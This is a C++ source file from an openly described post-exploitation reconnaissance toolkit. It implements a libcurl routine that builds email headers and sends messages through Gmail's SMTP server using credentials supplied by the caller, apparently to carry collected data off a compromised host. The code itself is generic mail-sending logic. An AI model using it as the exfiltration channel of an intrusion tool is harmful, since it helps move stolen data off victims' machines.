/*
This file is part of Post-recon
Copyright (C) 2017 @maldevel
https://github.com/maldevel/Post-recon

Post-recon - post-exploitation reconnaissance toolkit.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

For more see the file 'LICENSE' for copying permission.
*/

#include "prLibCurl.h"

#include <curl/curl.h>
#include "prCommon.h"
#include <Strsafe.h>

struct upload_status {
	int lines_read;
};

// .:: email headers ::.

// simple email
static const char *_simpleEmailHeader[] = {
	"Date: %s\r\n",						//e.g. Mon, 29 Nov 2010 21:54:29 +1100
	"To: %s\r\n",						//e.g. admin@example.org
	"From: %s(%s)\r\n",					//e.g. support@example.gr(Joe Doe)
	"Message-ID: <%s>\r\n",				//e.g. xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx@example.com
	"Subject: %s\r\n",					//subject
	"\r\n",								//do not remove
	"%s\r\n",							//body
	NULL
};

// email with attachment
static const char *_emailWithAttachmentHeader[] = {
	"Date: %s\r\n",
	"To: %s\r\n",
	"From: %s(%s)\r\n",
	"Message-ID: <%s>\r\n",
	"Subject: %s\r\n",
	"MIME-Version: 1.0",
	"Content-Type: multipart/mixed; boundary=\"%s\"\r\n",
	"--%s\r\n",
	"Content-type: text/plain; charset=UTF-8\r\n",
	"Content-Transfer-Encoding: 7bit\r\n\r\n",
	"BODY MESSAGE\r\n\r\n",
	"--%s\r\n",
	"Content-Type: application/octet-stream;\r\n",
	"Content-Transfer-Encoding: base64\r\n",
	"Content-Disposition: attachment; filename=\"%s\"\r\n\r\n",
	"%s",
	"\r\n--%s--\r\n",
	"\r\n.\r\n",
	NULL
};

//static char *_activeHeader;
static char **_emailHeader;

// :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

//libcurl email callback
static size_t _read_function_callback(void *ptr, size_t size, size_t nmemb, void *userp)
{
	struct upload_status *upload_ctx = (struct upload_status *)userp;
	const char *data;

	if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
		return 0;
	}

	data = _emailHeader[upload_ctx->lines_read];

	if (data)
	{
		size_t len = strlen(data);
		memcpy(ptr, data, len);
		upload_ctx->lines_read++;
		return len;
	}

	return 0;
}

//build DATE string
static HRESULT buildDate(char **result)
{
	char *_dateTime = 0;
	int _size = 0;

	if ((_dateTime = Common::GetTimezoneOffset()) == NULL) {
		return S_FALSE;
	}

	_size = strlen(_simpleEmailHeader[0]) + strlen(_dateTime);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(_dateTime);
		return S_FALSE;
	}

	if (_snprintf_s(*result, _size + 1, _TRUNCATE, _simpleEmailHeader[0], _dateTime) == -1) {
		Common::hFree(_dateTime);
		return S_FALSE;
	}

	Common::hFree(_dateTime);
	return S_OK;
}

//build To string
static HRESULT buildTo(const char *to, char **result)
{
	int _size = 0;

	_size = strlen(_simpleEmailHeader[1]) + strlen(to);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return S_FALSE;
	}

	if (_snprintf_s(*result, _size + 1, _TRUNCATE, _simpleEmailHeader[1], to) == -1) {
		return S_FALSE;
	}

	return S_OK;
}

static HRESULT buildFrom(const char *from, const char *name, char **result)
{
	int _size = 0;

	_size = strlen(_simpleEmailHeader[2]) + strlen(from) + strlen(name);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return S_FALSE;
	}

	if (_snprintf_s(*result, _size + 1, _TRUNCATE, _simpleEmailHeader[2], from, name) == -1) {
		return S_FALSE;
	}

	return S_OK;
}

//build MessageID string
static HRESULT buildMessageID(const char *from, char **result)
{
	char *_messageID = 0;
	int _size = 0;

	if ((Common::GenerateMessageID(from, strlen(from), &_messageID)) == S_FALSE) {
		return S_FALSE;
	}

	_size = strlen(_simpleEmailHeader[3]) + strlen(_messageID);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(_messageID);
		return S_FALSE;
	}

	if (_snprintf_s(*result, _size + 1, _TRUNCATE, _simpleEmailHeader[3], _messageID) == -1) {
		Common::hFree(_messageID);
		return S_FALSE;
	}

	Common::hFree(_messageID);
	return S_OK;
}

//build subject string
static HRESULT buildSubject(const char *subject, char **result)
{
	int _size = 0;

	_size = strlen(_simpleEmailHeader[4]) + strlen(subject);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return S_FALSE;
	}

	if (_snprintf_s(*result, _size + 1, _TRUNCATE, _simpleEmailHeader[4], subject) == -1) {
		return S_FALSE;
	}

	return S_OK;
}

//build body string
static HRESULT buildBody(const char *body, char **result)
{
	int _size = 0;

	_size = strlen(_simpleEmailHeader[6]) + strlen(body);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return S_FALSE;
	}

	if (_snprintf_s(*result, _size + 1, _TRUNCATE, _simpleEmailHeader[6], body) == -1) {
		return S_FALSE;
	}

	return S_OK;
}

//build email message
static HRESULT buildMessage(char **_data, const char *to, const char *from, const char *fromName, const char *subject, const char *body)
{
	//build DATE string
	if ((buildDate(&_data[0])) == S_FALSE) {
		return S_FALSE;
	}

	//build TO string
	if ((buildTo(to, &_data[1])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//build FROM string
	if ((buildFrom(from, fromName, &_data[2])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//build messageid string
	if ((buildMessageID(from, &_data[3])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//build subject string
	if ((buildSubject(subject, &_data[4])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//add new line
	if ((_data[5] = (char*)Common::hAlloc(3 * sizeof(char))) == NULL) {
		Common::hFree(_data);
		return S_FALSE;
	}

	if (strncpy_s(_data[5], 3, "\r\n", 2) != 0) {
		Common::hFree(_data);
		return S_FALSE;
	}

	// append body
	if ((buildBody(body, &_data[6])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	_data[7] = NULL;

	return S_OK;
}

HRESULT LibCurl::SendEmail(const char *from, const char *fromName, const char *to,
	const char *subject, const char *body, const char *password, int sendAttachment, const char *filename)
{
	CURL *curl;
	CURLcode res = CURLE_OK;
	struct curl_slist *recipients = NULL;
	struct upload_status upload_ctx;
	//char **data = 0;
	int dataSize = 8;
	int i = 0;

	upload_ctx.lines_read = 0;

	Common::init();

	if ((_emailHeader = (char**)Common::hAlloc(dataSize * sizeof(char*))) == NULL) {
		return S_FALSE;
	}

	buildMessage(_emailHeader, to, from, fromName, subject, body);
	//_emailHeader = data;

	curl = curl_easy_init();

	if (curl) {

		curl_easy_setopt(curl, CURLOPT_USERNAME, from);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
		curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);
		recipients = curl_slist_append(recipients, to);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, _read_function_callback);
		curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //debug, turn it off on production

		res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
		}

		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}

	for (i = 0; i < dataSize; i++) {
		Common::hFree(_emailHeader[i]);
	}

	Common::hFree(_emailHeader);

	//Common::hZero((void*)password, strlen(password));

	return (res == CURLE_OK ? S_OK : S_FALSE);
}
